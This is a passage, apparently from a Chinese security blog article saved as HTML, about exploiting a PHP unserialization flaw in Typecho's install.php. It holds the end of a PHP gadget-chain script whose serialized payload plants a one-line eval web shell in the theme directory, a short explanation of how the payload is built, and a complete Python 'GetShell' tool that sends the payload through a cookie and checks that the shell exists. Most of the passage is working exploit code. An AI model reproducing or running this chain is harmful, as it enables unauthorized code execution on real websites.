+    private $_params = array('screenName'=&gt;'fputs(fopen(\'./usr/themes/default/img/c.php\',\'w\'),\'&lt;?php @eval($_POST[a]);?&gt;\')');
+    private $_filter = array('assert');
+    //private $_filter = array('assert', array('Typecho_Response', 'redirect'));
+
+}
+
+$payload1 = new Typecho_Feed(5, 'ATOM 1.0');
+$payload2 = new Typecho_Request();
+$payload1-&gt;addItem(array('author' =&gt; $payload2));
+$exp['adapter'] = $payload1;
+$exp['prefix'] = 'Rai4over';
+echo base64_encode(serialize($exp));</code></pre><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">编写payload的简单思路：</h3><p style="margin-bottom: 1.2em !important;">最外层<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$exp</code>是数组，数组中的’adapter’是<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">Typecho_Feed</code>的实例<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$payload1</code>,  <code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$payload1</code>的构造参数是’ATOM 1.0’用于控制分支,  <code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$payload2</code>是<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">Typecho_Request</code>的实例,  <code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">private $_filter</code> ，<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">private $_params</code>是传给<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">call_user_func</code>的参数，也就是通过<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">assert</code>写<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">shell</code>  然后<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$payload2</code>通过<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">additem</code>添加到<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$payload</code>的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$_items</code>的变量中，最后把<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$payload1</code>添加到最外层的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">$exp</code>数组中</p><p style="margin-bottom: 1.2em !important;"><strong>ps：因为<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">install.php</code>中有<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">ob_start();</code>所以构造好是没有回显的，但是也能写shell<br/>后面其他师傅说可以用<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">Typecho_Response</code>类中的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">redirect</code>方法中的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border: 1px solid rgb(234, 234, 234);border-radius: 3px;display: inline;background-color: rgb(248, 248, 248);">exit()</code>得到回显</strong></p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">GetShell小工具</h3><p style="margin-bottom: 1.2em !important;">记得把php添加进环境变量</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border: 1px solid rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">import requests
+import os
+
+if __name__ == '__main__':
+    print ''' ____          ____      _ _  _
+| __ ) _  _  |  _ \ __ _(_) || |  _____  _____ _ __
+|  _ \| | | |  | |_) / _` | | || |_ / _ \ \ / / _ \ '__|
+| |_) | |_| |  |  _ &lt; (_| | |__  _| (_) \ V /  __/ |
+|____/ \__, |  |_| \_\__,_|_|  |_|  \___/ \_/ \___|_|
+      |___/
+    '''
+
+    targert_url = 'http://www.xxxxxxxx.xyz';
+
+    rsp = requests.get(targert_url + "/install.php");
+    if rsp.status_code != 200:
+        exit('The attack failed and the problem file does not exist !!!')
+    else:
+        print 'You are lucky, the problem file exists, immediately attack !!!'
+
+    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080", }
+
+    typecho_config = os.popen('php exp.php').read()
+
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
+              'Cookie': 'antispame=1508415662; antispamkey=cc7dffeba8d48da508df125b5a50edbd; PHPSESSID=po1hggbeslfoglbvurjjt2lcg0; __typecho_lang=zh_CN;__typecho_config={typecho_config};'.format(typecho_config=typecho_config),
+              'Referer': targert_url}
+
+    url = targert_url + "/install.php?finish=1"
+
+    requests.get(url,headers=headers,allow_redirects=False)
+
+    shell_url = targert_url + '/usr/themes/default/img/c.php'
+    if requests.get(shell_url).status_code == 200:
+        print 'shell_url: ' + shell_url
+    else:
+        print "Getshell Fail!"</code></pre><section class="" data-tools="135&#x7F16;&#x8F91;&#x5668;" data-id="86357" style="max-width: 100%;box-sizing: border-box;color: rgb(62, 62, 62);font-size: 16px;line-height: 25.6px;white-space: normal;font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;border: 0px none;word-wrap: break-word !important;background-color: rgb(255, 255, 255);"><section style="max-width: 100%;text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><section style="max-width: 100%;display: inline-block;width: 192px;box-sizing: border-box !important;word-wrap: break-word !important;"><section class="" data-tools="135编辑器" data-id="86357" style="max-width: 100%;box-sizing: border-box;border: 0px none;word-wrap: break-word !important;"><section style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"><p style="max-width: 100%;min-height: 1em;display: inline-block;width: 192px;box-sizing: border-box !important;word-wrap: break-word !important;"><img class="" data-ratio="0.125" data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?" data-type="png" data-w="600" style="display: inline;box-sizing: border-box !important;word-wrap: break-word !important;visibility: visible !important;width: 192px !important;" title="墨迹晕染分割线" width="192px" src="../Images/c96a1b435221f7e6cf4c4e3eca199d9e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?"/></p></section></section></section></section></section><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;line-height: 25.6px;white-space: normal;font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;box-sizing: border-box !important;word-wrap: break-word !important;background-color: rgb(255, 255, 255);"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"/></p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;line-height: 25.6px;white-space: normal;font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;box-sizing: border-box !important;word-wrap: break-word !important;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.3036773428232503" data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?" data-type="jpeg" data-w="843" style="line-height: 25.6px;box-sizing: border-box !important;word-wrap: break-word !important;visibility: visible !important;width: auto !important;" width="auto" src="../Images/4f6f4b18070490b9670250379d20693d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?"/></p>
+        
+</body>
+</html>
